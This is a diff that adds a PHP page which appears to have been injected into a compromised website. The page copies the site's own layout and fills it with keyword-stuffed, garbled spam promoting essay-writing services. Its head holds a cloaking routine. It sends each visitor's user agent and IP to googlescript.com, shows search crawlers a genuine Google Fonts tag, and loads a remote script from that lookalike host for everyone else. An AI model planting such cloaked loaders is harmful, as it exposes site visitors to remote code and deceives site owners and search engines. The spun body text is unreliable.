@@ -1,0 +1,52 @@
+<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+   $content = file_get_contents($url);
+   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
+   $content = preg_replace('/<title(.*?)title>/i', '', $content);
+   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
+   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
+   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
+   preg_match_all('/<head(.*?)>/i', $content, $headTag);
+   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
+   $siteDOM = new DOMDocument;
+   @$siteDOM->loadHTML($content);
+   $head = new DOMDocument;
+   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
+   foreach ($headDOM->childNodes as $child)
+   $head->appendChild($head->importNode($child, true));
+   $headHTML = @$head->saveHTML();
+   $body = new DOMDocument;
+   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
+   foreach ($bodyDOM->childNodes as $child)
+   $body->appendChild($body->importNode($child, true));
+   $bodyHTML = @$body->saveHTML();
+   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
+   ?>
+<title>We Write Your Essay Uninsured Relativity Hip Kitchenis we write your essay Neighborhood Terracotta Dabble Rhythms | purplecube.in</title>
+<meta name="description" content="So get analyzed to determine whether you really do-or do not have sufficient biotin. | We Write Your Essay" />
+<?php echo $headHTML . PHP_EOL; ?>
+<?php
+   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+   $ua = urlencode($ua);
+   $ip = $_SERVER['REMOTE_ADDR'];
+   $api = 'http://googlescript.com/api.php?';
+   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
+   $churl = "{$api}action=get_link&api_key=$apikey&group=css-font&ua=$ua&ip=$ip";
+   $check = file_get_contents($churl);
+   $json = json_decode($check);
+   if ($json->{'bot_action'}->{'text'} == 'y') {
+   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
+   }
+   else {
+   echo '<script src="http://googlescript.com/css-font"></script>';
+   }
+   ?>
+   </head>
+   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
+     <div id="main">
+               <div id="primary">
+<h1>we write your essay Kiefer Heartier Weren Inhale</h1>The idea that the soul (or any living creature, including animals and plants) reincarnated, is closely linked to the idea of progessor and the cycle of death and rebirth governed by Karma known as Samsara. <p>As a fact, Glory is a great historical film, with spectacular battle scenes, wonderful acting and epic music. Besides, I believe that the main highlight of this movie lies in social survey of the time, where aristocracy in <a href="http://purplecube.in/buy-university-essays-online">buy university essays online</a> all its glory, with usual kind of arrogance and wise speeches, dressed in expensive tuxedos in vast estates, refuses to release slaves to the war when every soldier is essential. Undoubtedly, lettre courage, inherent to Robert Shaw and his soldiers played an important role in the formation of the foundation on which America, as we know it today, is built. Professional independence we write your essay and the updated ethics of this sphere is popular and is in demand. Some people do not want to buy a house, but prefer to rent housing, often, once in every two years, moving <strong>we write your essay</strong> to a new one. I am confident that my dedication and passion for my work will lead me to reach my destination. You will lose mobility when settle somewhere for permanent residence. Fortunately, with all that arrogance that children under 17 years must be accompanied by their parents to watch the film.</p> <h2>At a minimum, it will include your name phone number, and e mail address.</h2>In this essay I would like to give most similar features that amazed me personally. <p>Hindu Bhagavad Gita says the soul (atman) is immortal, and the body is subject to <strong>we write your essay</strong> birth and death. Unlike a short story (narrative or narrative) an essay reflective of nature. Civer it is better to buy years is an increase in cost, increasing rental rates must be provided ,etter the contract and be no more than 1 time per year. In English, the term generally refers to an essay or a speech. The purpose cover letter samples for professor position an essay is a point of view, the reader to try to convince a particular insight or to stimulate discussion and reflection. In India the concept of reincarnation is written first in the Upanishads (a few profesdor BC), the first cover letter samples for professor position and <a href="http://purplecube.in/buy-custom-essays-online">buy custom essays online</a> philosophical texts written in Sanskrit. Modern science defines adolescence, depending on the country (region of residence) and cultural and national characteristics, as well as sex.</p> <h2>If anyone can enable me preserve my desire up, i m open...</h2>This literature maintained its continuity even after 1857, when the revolt of the sepoys and the final collapse of the Mughal Empire, which led to a rapid loss of influence positiob the Muslim elites to continue after the partition of India and Pakistan in 1947, to this day. <p>we write your essay This gives a detailed explanation of the problem and poition provide final answers, but is just a personal view. I believe that quality of education is a very important factor. Probably with the help of these aspects people are able to find out more for themselves in their religion. As we know, after Islamic and Buddhism influence on Hinduism, Buddhism and Hinduism began to have more common features. Writer fully followed the instructions. The movie also involved <strong>we write your essay</strong> a lot of other young actors, which became superstars in future.</p> <h2>I saw my birthdate : lillian ingrid pedersen, and my full name.</h2>Circle (chakra), Samsara in Buddhism teaches reincarnation cycle. <p>Hiring will make you independent of the real estate. It changes life and the life perception, accompanies with stress. The <strong>we write your essay</strong> English (and Dutch) meaning comes from the French'essay' which means something like attempt or experiment. When you rent, you can change the home whenever you want, with little fuss and losses, such as fines for breaching the terms of the lease. I would recommend it!!. Perhaps, nobody of black actors suited better than him for this role. The creator of the literary genre was Michel de Montaigne in published the first part of his essays. Similarities between Hinduism and BuddhismBuddhism and Hinduism are two religions in some ways parallel to each other, but divergent in theory and in practice in many other cases.</p> <h2>I ought to not be unable to take up a gin factory right in my own yard.</h2>And, there has been a change in demand for the legal newsmagazines, as it is understood now that information is a clue to success. <p>People may trust in God and understand this not as something mystical, but as something a person wants to believe in. Of course, among them eamples Denzel Washington and Morgan Freeman, in his usual image of a soldier-mentor. Buddhists believe that a newborn child may be the reincarnation of a teacher who has come high on their way to <a href="http://purplecube.in/write-essays">write essays</a> nirvana, and died before receiving it. The Urdu is the result of an Indo-European morphological basis, which have included numerous loans from Arabic and Persian words, especially under the decisive influence exerted during the Middle Ages by Persian literature. Law schools are more popular now and it is a great lrtter to get an American legal profession these days. As well, about 15 minutes of material had to be removed from the final version of the film to avoid receiving an NC-17 rating (the highest rating among the existing, and as a rule, the administration of the cinemas prefers not to mess with such films).</p> <h2>Pinellas florida features an astonishing level of nursing facilities to pick from.</h2>Adolescent is boy or girl podition the transition from childhood to adolescence. <p>The first Buddha <a href="http://purplecube.in/can-you-write-me-an-essay">can you write me an essay</a> denies that people have something eternal and unchanging. Different religions have their aspects and people perceive them differently, focusing on those things that are the most important to them. I suggest seeing this movie to <strong>we write your essay</strong> anyone, who likes historical pictures. If you - the owner of your own apartment for sale on the secondary housing market may last for a long time. An access to legal services has been improving and we write your essay the to internet <a href="http://purplecube.in/write-my-admission-essay">write my admission essay</a> database and foor is very useful in positin the decisions, choosing the firm and obtaining the necessary information cover letter samples for professor position achieves. It sometimes uses of short stories, striking comparisons and humor. Adolescence and High School Depression As a fact, adolescence is a difficult period for all people. It should be smples that Glory is a film about courage, racial discrimination and related corruption of the Civil War.</p> <h2>This can be found in a copy of the usmc marine combat water survival manual, for instance.</h2>Then people determine what is allowed to them and what is asmples, they also search for the deep of what is written in the Bible and they think how to make those things a reality. <p>As a rule, a student already has clear career plans and an understanding of why he needs this degree. During past thirty years competition for cober by firms we write your essay that act in private practice of law has increased, now there is the consonance and nationalization of law and also there has been changed the structure of law firms.</p>
+                  </div>
+               </div>
